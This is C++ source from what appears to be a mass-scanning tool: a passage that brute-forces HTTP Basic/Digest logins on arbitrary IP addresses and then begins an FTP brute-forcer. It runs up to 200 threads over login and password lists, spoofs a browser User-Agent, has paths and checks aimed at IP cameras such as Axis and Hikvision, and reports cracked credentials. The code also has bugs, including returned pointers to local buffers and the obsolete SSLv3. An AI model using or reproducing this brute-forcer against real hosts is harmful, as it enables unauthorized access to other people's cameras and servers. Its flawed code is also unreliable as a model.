#pragma once
#include "STh.h"
#include <libssh/libssh.h>
#include <sstream>
#include <openssl/md5.h>
#include "resource.h"
#include "externFunctions.h"
#include "externData.h"
#pragma once

#if defined(Q_OS_WIN32)
#include <iphlpapi.h>
#include <icmpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#endif
int gMaxBrutingThreads = 200;

void BConInc()
{
	__asm
	{
		lock inc BrutingThrds;
	};
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
	++BA;
};
void BConDec()
{
	if(BrutingThrds > 0)
	{
		__asm
		{
			lock dec BrutingThrds;
		};
	}
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
};
void SSHConInc()
{
	__asm
	{
		lock inc BrutingThrds;
	};
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
};
void SSHConDec()
{
	__asm
	{
		lock dec BrutingThrds;
	};
#pragma region QTGUI_Area
	stt->doEmitionChangeBA(QString::number(BrutingThrds));
#pragma endregion
};
bool debugWriteWait = false;
void _DebugWriteHTMLToFile(char *request, char *buff)
{
	while(debugWriteWait) Sleep(50);
	debugWriteWait = true;
	FILE *df = fopen("./debugData.txt", "a");

	if(df != NULL)
	{
		fputs(request, df);
		fputs("==========================\n", df);
		fputs(buff, df);
		fputs("\n==========================\n==========================\n\n", df);
		fclose(df);
	}
	else
	{
		stt->doEmitionRedFoundData("[DEBUG] Cannot open debugData.txt");
	};
	debugWriteWait = false;
};
unsigned char tl(unsigned char d)
{
	if(d >= 192 && d <= 223)
	{
		unsigned char y = d + 32;
		return y;
	}
	else 
	{
		return tolower(d);
	};
};
int recvWT( 
	int Socket, 
	char *Buffer, 
	int Len, 
	long Timeout, 
	int *bTimedOut 
	){ 
		fd_set ReadSet; 
		int n;
		struct timeval Time; 

		FD_ZERO(&ReadSet); 
		FD_SET(Socket,&ReadSet); 
		Time.tv_sec = Timeout; 
		Time.tv_usec = 0; 
		*bTimedOut = FALSE; 
		n = select(Socket+1,&ReadSet,NULL,NULL,&Time); 
		if (n > 0) { /* got some data */ 
			return recv(Socket,Buffer,Len,0); 
		} 
		if (n == 0) { /* timeout */ 
			*bTimedOut = TRUE; 
		} 
		return(n) ; /* trouble */ 
}
std::string toLowerStr(const char *str)
{
	int tsz = strlen(str);
	if(tsz == 1)
	{
		if(str[0] == 10) return "[No data!]";
		else return str;
	}
	else if(tsz > 1)
	{
		char * strr = new char[tsz+1];
		ZeroMemory(strr, tsz);

		for (int i = 0; i < tsz; i++) 
		{
			strr[i] = tl(str[i]);
		};

		memset(strr + tsz, '\0', 1);

		std::string tstr = strr;
		delete []strr;
		return tstr;
	};
	return "";
};
int OpenConnection(SOCKET *sock, const char *hostname, int port)
{   
	struct hostent *host;
	struct sockaddr_in addr;
	if(strlen(hostname) == 0) 
	{
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
		return -1;
	};
	if(port < 0 || port > 65535) 
	{
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
		return -1;
	};

	if ( (host = gethostbyname(hostname)) == NULL )
	{
		++offlines;
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
		return -1;
	};
	*sock = socket(PF_INET, SOCK_STREAM, 0);
	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = *(long*)(host->h_addr);
	if ( connect(*sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR )
	{
		++offlines;
		closesocket(*sock);
		return -1;
	};
	return 0;
}

void _baSSLWorker(char *ip, char *request, char *rvBuff)
{
	SSL_CTX *ctx = NULL;
	const SSL_METHOD *method = SSLv3_client_method();  /* Create new client-method instance */
	ctx = SSL_CTX_new(method);   /* Create new context */
	SSL_CTX_set_timeout(ctx, gTimeOut);
	SOCKET sock;
	if(ctx != NULL)
	{
		int result = OpenConnection(&sock, ip, 443);
		if(result >= 0)
		{
			SSL *ssl = NULL;
			ssl = SSL_new(ctx);      /* create new SSL connection state */
			if(ssl != NULL)
			{
				SSL_set_fd(ssl, sock);    /* attach the socket descriptor */
				if(SSL_connect(ssl))
				{
					SSL_write(ssl, request, strlen(request));
					if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));

					char tempBuff[128] = {0};
					int x = 1;
					int xx = 0;

					ZeroMemory(rvBuff, sizeof(rvBuff));
					while(xx < 512)
					{
						x = SSL_read(ssl, tempBuff, sizeof(tempBuff));
						if(x <= 0) break;
						Activity += x;
						xx += x;
						strncat(rvBuff, tempBuff, x);
						ZeroMemory(tempBuff, sizeof(tempBuff));
					};

					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(rvBuff));
					if(HTMLDebugMode) _DebugWriteHTMLToFile(request, rvBuff);
				};
				SSL_shutdown(ssl);
				SSL_free(ssl);
				closesocket(sock);         /* close socket */
				SSL_CTX_free(ctx);        /* release context */
				return;
			};
		};
		closesocket(sock);         /* close socket */
		SSL_CTX_free(ctx);        /* release context */
	}
	else
	{
		stt->doEmitionRedFoundData("SSL(InitCTX).");
	};
};
char *_getAttributeValue(char *str, char *val, char *ip, int port)
{
	char res[1024] = {0};
	char *ptrStart = NULL; 
	char *ptrS1End = NULL;
	char *ptrS2End = NULL;

	ptrStart = strstri(str, val);
	if(ptrStart != NULL)
	{
		if(strstri(ptrStart, "qop=auth") != NULL) return "auth";
		ptrS1End = _findFirst(ptrStart, "\"");
		if(ptrS1End != NULL)
		{
			ptrS2End = _findFirst(ptrS1End + 1, "\"");
			if(ptrS2End != NULL)
			{
				int sz = ptrS2End - ptrS1End - 1;

				if(sz != 0 && sz < 1024) strncpy(res, ptrS1End + 1, sz);
				else return "";

				return res;
			}
			else
			{
				stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
				return "";				
			};
		}
		else
		{
			stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#919121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
			return "";				
		};
	}
	else
	{
		stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
		return "";
	};
};

#define HASHLEN 16
typedef char HASH[HASHLEN];
#define HASHHEXLEN 32
typedef char HASHHEX[HASHHEXLEN+1];
#define IN
#define OUT
void CvtHex(
    IN HASH Bin,
    OUT HASHHEX Hex
    )
{
    unsigned short i;
    unsigned char j;

    for (i = 0; i < HASHLEN; i++) {
        j = (Bin[i] >> 4) & 0xf;
        if (j <= 9)
            Hex[i*2] = (j + '0');
         else
            Hex[i*2] = (j + 'a' - 10);
        j = Bin[i] & 0xf;
        if (j <= 9)
            Hex[i*2+1] = (j + '0');
         else
            Hex[i*2+1] = (j + 'a' - 10);
    };
    Hex[HASHHEXLEN] = '\0';
};
char *_makeDigestResponse(
	char *login, 
	char *realm, 
	char *pass, 
	char *path, 
	char *nonce,
	char *pszNonceCount,
	char *pszCNonce,
	char *pszQop
	)
{
	char HA1[MD5_DIGEST_LENGTH];
	char HA2[MD5_DIGEST_LENGTH];
	char HA1Data[512] = {0};
	char HA2Data[512] = {0};

	strcpy(HA1Data, login);
	strcat(HA1Data, ":");
	strcat(HA1Data, realm);
	strcat(HA1Data, ":");
	strcat(HA1Data, pass);

	strcpy(HA2Data, "GET:");
	strcat(HA2Data, path);

	MD5((unsigned char*) HA1Data, strlen(HA1Data), (unsigned char*)HA1);
	MD5((unsigned char*) HA2Data, strlen(HA2Data), (unsigned char*)HA2);

	char responseData[512] = {0};
	char *HA1MD5 = new char[64];
	char *HA2MD5 = new char[64];
	ZeroMemory(HA1MD5, 64);
	ZeroMemory(HA2MD5, 64);

	CvtHex(HA1, HA1MD5);
	strcpy(responseData, HA1MD5);
	strcat(responseData, ":");
	strcat(responseData, nonce);
	strcat(responseData, ":");
	if (*pszQop != NULL) {
		strcat(responseData, pszNonceCount);
		strcat(responseData, ":");
		strcat(responseData, pszCNonce);
		strcat(responseData, ":");
		strcat(responseData, pszQop);
		strcat(responseData, ":");
      };
	CvtHex(HA2, HA2MD5);
	strcat(responseData, HA2MD5);
	delete []HA1MD5;
	delete []HA2MD5;

	char response[MD5_DIGEST_LENGTH];
	MD5((unsigned char*) responseData, strlen(responseData), (unsigned char*)response);
	char responseMD5[64] = {0};
	CvtHex(response, responseMD5);
	return (char*)responseMD5;
};
lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
{
	if(strcmp(method, "[DIGEST]") != 0 && strcmp(method, "[NORMAL]") != 0) stt->doEmitionRedFoundData("[-] Unknown method IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + + "</a>"); 
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	int cookieLen = strlen(cookie);
	char path[512] = {0};
	strncpy(path, pathT, 512);

	int bTO;
	bool goon = false;
	char hRqst[REQUEST_MAX_SIZE] = {0};
	char headerMsg[REQUEST_MAX_SIZE] = {0};
	char hMsgR[512] = {0};

	strcpy(hRqst, "GET ");
	strcat(hRqst, path);
	strcat(hRqst, " HTTP/1.1\r\nHost: ");
	strcat(hRqst, ip);
	if(port != 80){
		strcat(hRqst, ":");
		char tbuff[16] = {0};
		strcat(hRqst, itoa(port, tbuff, 10));
	};
	if(cookieLen != 0)
	{
		strcat(hRqst, "\r\nCookie: ");
		strcat(hRqst, cookie);
	};
	strcat(hRqst, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic bG9sa2E6bG9sa2F=\r\n\r\n");
	
	sockaddr_in sockAddr;
	SOCKET sock;
#pragma region VerifyBASSL
	if(port == 443)
	{
		ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
//		while(baSSLLocked) Sleep(200);
//		baSSLLocked = true;
		_baSSLWorker(ip, hRqst, headerMsg);
//		baSSLLocked = false;
	}
#pragma endregion
	else
#pragma region VerifyBA
	{
		sockAddr.sin_family = AF_INET;
		sockAddr.sin_port = htons(port);
		HOSTENT *host;
#if defined(WIN32)
		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
		else
		{
			isActive = 0;
			strcpy(lps.login, "UNKNOWN");
			return lps;
		};
#else
		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
		else
		{
			isActive = 0;
			strcpy(lps.login, "UNKNOWN");
			return lps;
		};
#endif
		SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));

		send(sock, hRqst, strlen(hRqst), 0);
		if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(hRqst));
		ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
		int x = 1;
		int xx = 0;
		while(xx < 512)
		{
			x = recvWT(sock, hMsgR, sizeof(hMsgR), gTimeOut + 10, &bTO);
			if(x <= 0) break;
			strncat(headerMsg, hMsgR, x);
			xx += x;
			ZeroMemory(hMsgR, sizeof(hMsgR));
		};
		if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(headerMsg));
	};
#pragma endregion
	if(strlen(headerMsg) == 0)
	{
		isActive = 0;

		strcpy(lps.login, "UNKNOWN");
		return lps;
	};
	if(strstr(headerMsg, "401 ") == NULL 
		&& strstr(headerMsg, ".1 401") == NULL 
		&& strstr(headerMsg, ".0 401") == NULL
		&& strstr(headerMsg, "<statusValue>401</statusValue>") == NULL
		&& strstr(headerMsg, "<statusString>Unauthorized</statusString>") == NULL
		)
	{
		if(strstri(headerMsg, "400 Bad") != NULL)
		{
			shutdown(sock, SD_BOTH);
			closesocket(sock);

			strcpy(lps.other, "[400 Bad Request]");
			isActive = 0;
			return lps;
		}
		else if(strstri(headerMsg, "404 Not") != NULL 
			|| strstr(headerMsg, "404 ") != NULL 
			|| strstr(headerMsg, ".1 404") != NULL 
			|| strstr(headerMsg, ".0 404") != NULL
			)
		{
			if(strstr(path, "/axis-cgi/com/ptz.cgi?") != NULL)
			{
				int sz = strlen("/view/viewer_index.shtml");
				strncpy(path, "/view/viewer_index.shtml", sz);
				memset(path + sz, 0, 1);
				goon = true;
			}
			else
			{
				shutdown(sock, SD_BOTH);
				closesocket(sock);

				strcpy(lps.other, QString("[404 Not Found (" + QString(path) + ")]").toLocal8Bit().data());
				isActive = 0;
				return lps;
			};
		}
		else if(															//
			(strstr(headerMsg, ".1 403") != NULL							//
			|| strstr(headerMsg, ".0 403") != NULL							//Hikkvision2
			)																//
			&& strstr(headerMsg, "badAuthorization") != NULL				//
			)
		{
			goon = true;
		}
		else if(strlen(headerMsg) < 16)
		{
			goon = true;
			stt->doEmitionRedFoundData("Corrupted reply: (" + QString(headerMsg) + ") " + QString(ip) + ":"+ QString::number(port));
		};

		if(goon == false)
		{
			shutdown(sock, SD_BOTH);
			closesocket(sock);

			strcpy(lps.login, "NULL");
			strcpy(lps.pass, "NULL");
			isActive = 0;
			return lps;
		};
	};

	shutdown(sock, SD_BOTH);
	closesocket(sock);
#pragma endregion

	isActive = 1;
	char tPass[256] = {0};
	char curLogin[256] = {0};
	char curPass[256] = {0};
	int cCode;
	int cErrCode;
	int x = 1;
	int dataSz = 0;
	char request[REQUEST_MAX_SIZE] = {0};
	char recvBuff[4096] = {0};
	char recvBuff2[512] = {0};
	char pass[256] = {0};
	int WSAErr;

	char localBuff[4096] = {0};
	strcpy(localBuff, headerMsg);
	int passCounter = 1;
	char attribute[2048] = {0};
	char nonce[512] = {0};
	char realm[512] = {0};
	char opaque[512] = {0};
	char qop[64] = {0};
	std::string encoded = "";

	for(int i = 0; i < MaxLogin; i++)
	{
		if(globalScanFlag == false) break;
		for(int j = 0; j < MaxPass; j++)
		{
			if(globalScanFlag == false) break;

			ZeroMemory(request, REQUEST_MAX_SIZE);
			ZeroMemory(curLogin, sizeof(curLogin));
			ZeroMemory(curPass, sizeof(curPass));
			strcpy(curLogin, loginLst[i]);
			strcpy(curPass, passLst[j]);

			if(strcmp(method, "[DIGEST]") == 0 && strstr(localBuff, "nonce=") != NULL)
			{
				ZeroMemory(attribute, sizeof(attribute));
				strcpy(attribute, _getAttribute(localBuff, "WWW-Authenticate:"));
				ZeroMemory(nonce, sizeof(nonce));
				strcpy(nonce, _getAttributeValue(attribute, "nonce=", ip, port));
				ZeroMemory(realm, sizeof(realm));
				strcpy(realm, _getAttributeValue(attribute, "realm=", ip, port));
				ZeroMemory(qop, sizeof(qop));
				if(strstri(attribute, "qop") != NULL)
				{
					strcpy(qop, _getAttributeValue(attribute, "qop=", ip, port));
				};

				strcpy(request, "GET ");
				strcat(request, path);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				if(cookieLen != 0)
				{
					strcat(request, "\r\nCookie: ");
					strcat(request, cookie);
				};
				
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Digest username=\"");					
				strcat(request, curLogin);
				strcat(request, "\", realm=\"");
				strcat(request, realm);
				strcat(request, "\", nonce=\"");
				strcat(request, nonce);
				strcat(request, "\", uri=\"");
				strcat(request, path);
				strcat(request, "\", qop=auth, response=\"");
				strcat(request, _makeDigestResponse(curLogin, realm, curPass, path, nonce, "10000001", "9d531d56796e0dc9", qop));
				if(strstri(attribute, "opaque") != NULL)
				{
					ZeroMemory(opaque, sizeof(opaque));
					strcpy(opaque, _getAttributeValue(attribute, "opaque=", ip, port));
					strcat(request, "\", opaque=\"");
					strcat(request, opaque);
				};
				strcat(request, "\", nc=10000001, cnonce=\"9d531d56796e0dc9\"");
				strcat(request, "\r\nConnection: close\r\n\r\n");
			}
			else
			{
				ZeroMemory(tPass, sizeof(tPass));
				strncpy(tPass, curLogin, strlen(curLogin));
				strcat(tPass, ":");
				strncat(tPass, curPass, strlen(curPass));
				encoded = base64_encode((const unsigned char *)tPass, strlen(tPass));
				strcpy(request, "GET ");
				strcat(request, path);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				if(cookieLen != 0)
				{
					strcat(request, "\r\nCookie: ");
					strcat(request, cookie);
				};
				
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic ");					
				strcat(request, encoded.c_str());
				strcat(request, "\r\nConnection: close\r\n\r\n");
			};
			
#pragma region BABSEQ-HTTPS
			if(port == 443)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				if(BALogSwitched) stt->doEmitionBAData("Probing SSL:BA " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(tPass) + ";");
				_baSSLWorker(ip, request, recvBuff);
				dataSz = strlen(recvBuff);
			}
#pragma endregion
			else
#pragma region BABSEQ-HTTP
			{
				sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
				cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
				cErrCode = WSAGetLastError();

				while(cErrCode == 10038)
				{
					if(gDebugMode) stt->doEmitionDebugFoundData("[BA] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
					shutdown(sock, SD_BOTH);
					closesocket(sock);
					sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
					cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
					cErrCode = WSAGetLastError();
				};
				if(cCode != SOCKET_ERROR) 
				{
					x = 1;
					Activity += strlen(request);

					if(send(sock, request, strlen(request), 0) != SOCKET_ERROR) 	
					{
						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
						dataSz = 0;
						ZeroMemory(recvBuff2, sizeof(recvBuff2));
						ZeroMemory(recvBuff, sizeof(recvBuff));
						while (x > 0 && dataSz < 3384)				
						{
							ZeroMemory(recvBuff2, sizeof(recvBuff2));
							x = recvWT(sock, recvBuff2, sizeof(recvBuff2), gTimeOut + 5, &bTO);

							dataSz += x;
							Activity += x;
							strncat(recvBuff, recvBuff2, x);
						};
						if(BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
					}
					else
					{
						stt->doEmitionRedFoundData("[BA] Send error! [" + QString(ip) + "]");

						shutdown(sock, SD_BOTH);
						closesocket(sock);
						isActive = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					}
				}
				else
				{
					int WSAErr = WSAGetLastError();
					if(WSAErr != 10060)
					{
						stt->doEmitionRedFoundData("[BA] Cannot connect to " + QString(ip) + "[" + QString::number(WSAErr) + "]");
					};

					shutdown(sock, SD_BOTH);
					closesocket(sock);

					isActive = 0;

					strcpy(lps.login, "UNKNOWN");
					return lps;
				};

				shutdown(sock, SD_BOTH);
				closesocket(sock);
			};
#pragma endregion
			
			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));

			if(dataSz == 0)
			{
				stt->doEmitionBAData("[BA] No reply from: " + QString(ip) + "; Repeating...");
				--j;
				continue;
			}
			else
			{
				++passCounter;
			};

			if(strcmp(method, "[DIGEST]") == 0)
			{
				ZeroMemory(localBuff, sizeof(localBuff));
				strcpy(localBuff, recvBuff);
			};
			
			if(strstri(recvBuff, "http/1.1 401") == NULL
				|| strstri(recvBuff, "http/1.0 401") == NULL
				)
			{
				///dummy///
			}
			else if(strstri(recvBuff, "503 service unavailable") != NULL 
				|| strstri(recvBuff, "http/1.1 503") != NULL 
				|| strstri(recvBuff, "http/1.0 503") != NULL
				|| strstr(recvBuff, "400 BAD_REQUEST") != NULL
				|| strstri(recvBuff, "400 bad request") != NULL
				|| strstr(recvBuff, "403 Forbidden") != NULL
				)
			{
#pragma region QTGUI_Area
				stt->doEmition_BARedData("[.] 503/400/403 - Waiting 30sec (" + QString(ip) + ":" + QString::number(port) + ")");
#pragma endregion

				if(j > 0) --j;
				Sleep(30000);
			}
			else if((strstri(recvBuff, "http/1.1 404") != NULL 
				|| strstri(recvBuff, "http/1.0 404") != NULL
				) 
				&& strstri(recvBuff, "Authorization required") == NULL
				)
			{
				if(HTMLDebugMode) _DebugWriteHTMLToFile(request, recvBuff);

#pragma region QTGUI_Area
				stt->doEmitionRedFoundData("[-] 404 - Wrong path detected. (" + QString(ip) + ":" + QString::number(port) + QString(path) + ")");
#pragma endregion
				isActive = 0;
				strcpy(lps.login, "UNKNOWN");
				return lps;
			}
			else if( (strstri(recvBuff, "200 ok") != NULL 
				|| strstri(recvBuff, "http/1.0 200") != NULL
				)
				&& strstri(recvBuff, "http/1.1 401 ") == NULL
				&& strstri(recvBuff, "http/1.0 401 ") == NULL
				&& strstr(headerMsg, "<statusValue>401</statusValue>") == NULL
				&& strstr(headerMsg, "<statusString>Unauthorized</statusString>") == NULL
				&& dataSz > 13
				) 
			{
				if(strstri(recvBuff, "access is denied") == NULL 
					&& strstri(recvBuff, "iisstart") == NULL 
					&& strstri(recvBuff, "Location:") == NULL
					&& strstri(recvBuff, "access forbidden") == NULL
					)
				{
					ZeroMemory(pass, sizeof(pass));
					strcpy(pass, ip);
					strcat(pass, " - Password found: ");
					strcat(pass, tPass);
					isActive = 0;
					stt->doEmition_BAGreenData("[+] " + QString(pass));
					strcpy(lps.login, curLogin);
					strcpy(lps.pass, curPass);
					return lps;
				};
			}
			else
			{
				ZeroMemory(pass, sizeof(pass));
				strcpy(pass, ip);
				strcat(pass, " - Password found: ");
				strcat(pass, tPass);
				isActive = 0;
				char *pt1 = strstr(recvBuff, " ");
				if(pt1 != NULL)
				{
					char *pt2 = strstr(pt1 + 1, " ");
					if(pt2 != NULL)
					{
						int sz = pt2 - pt1 - 1;
						char tempHeaderCode[16] = {0};
						strncpy(tempHeaderCode, pt1 + 1, sz);
						
						if(strcmp(tempHeaderCode, "302") == 0 && strcmp(tempHeaderCode, "200") == 0) stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (" + QString(tempHeaderCode) + ") IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");
						strcpy(lps.login, curLogin);
						strcpy(lps.pass, curPass);
						return lps;
					};
				};
				stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
				strcpy(lps.login, curLogin);
				strcpy(lps.pass, curPass);
				return lps;
			};
			if(strstr(recvBuff, "Set-Cookie:") != NULL)
			{
				ZeroMemory(cookie, COOKIE_MAX_SIZE);
				strncpy(cookie, _getAttribute(recvBuff, "Set-Cookie:"), COOKIE_MAX_SIZE);
				cookieLen = strlen(cookie);
			};
		};
	};
#pragma endregion
	isActive = 0;

	strcpy(lps.login, "UNKNOWN");
	return lps;
}
lopaStr Connector::_BALobby(char *cookie, char *ip, int port, char *path, char *method, char *data = NULL)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);
	
	BConInc();
	lopaStr res = _BABrute(cookie, ip, port, path, method);
	BConDec();
	
	return res;
};
lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	char recvBuff[1024] = {0}, request[64] = {0};
	int connectionResult, closedSocket = 1, loginFailedFlag = 0; 
	SOCKET sockFTP;
	sockaddr_in sockAddr;  
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  

#if defined(WIN32)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
		strcpy(lps.login, "UNKNOWN");
		return lps;
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		strcpy(lps.login, "UNKNOWN");
		return lps;
	};
#endif

	bool breakPassLoop = 0;
	int passCounter = 1;
	int bTO;
	int x = 0;

	for(int i = 0; i < MaxLogin; ++i)
	{
		if(globalScanFlag == false) break;
		if(strlen(loginLst[i]) <= 1) continue;
		for(int j = 0; j < MaxPass; ++j)
		{
			if(globalScanFlag == false) break;
			if(strlen(passLst[j]) <= 1) continue;
			if(closedSocket) 
			{
				closedSocket = 0;
				sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
				connectionResult = connect(sockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));
				int cErrCode = WSAGetLastError();

				while(cErrCode == 10038)
				{
					if(gDebugMode) stt->doEmitionDebugFoundData("[FTP] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
					shutdown(sockFTP, SD_BOTH);
					closesocket(sockFTP);
					sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
					connectionResult = connect(sockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));
					cErrCode = WSAGetLastError();
				};
				loginFailedFlag = 0;
			};

			isActive = 1;

			if(connectionResult != SOCKET_ERROR) 
			{
				x = 0;
				while (true)
				{
					Sleep(100);
					if(globalScanFlag == false) break;
					ZeroMemory(recvBuff, sizeof(recvBuff));
					x = recvWT(sockFTP, recvBuff, 1024, gTimeOut + 5, &bTO);
					if(x <= 0) break;
					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));

					Activity += x;
					closedSocket = 0;
					if(strstr(recvBuff, "451 The parameter is incorrect") != NULL
						)
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						isActive = 0;
						stt->doEmition_BARedData("[*] Unknown protocol (451 Error) - " + QString(ip));
						strcpy(lps.other, "Unknown protocol (451 Error)");
						return lps;
					};

					if(strstri(recvBuff, "only anonymous") != NULL)
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						isActive = 0;
#pragma region QTGUI_Area
						stt->doEmition_BAGreenData("[*] Anonymous access detected - " + QString(ip));
#pragma endregion
						strcpy(lps.login, "anonymous");
						strcpy(lps.pass, "1");
						return lps;
					};

					if(strstr(recvBuff, "550 no connections allowed") != NULL
						|| strstr(recvBuff, "550-") != NULL
						)
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);

						isActive = 0;

#pragma region QTGUI_Area
						stt->doEmition_BARedData("[-] 550 (No connections allowed) - Ban detected. Dropping " + QString(ip));
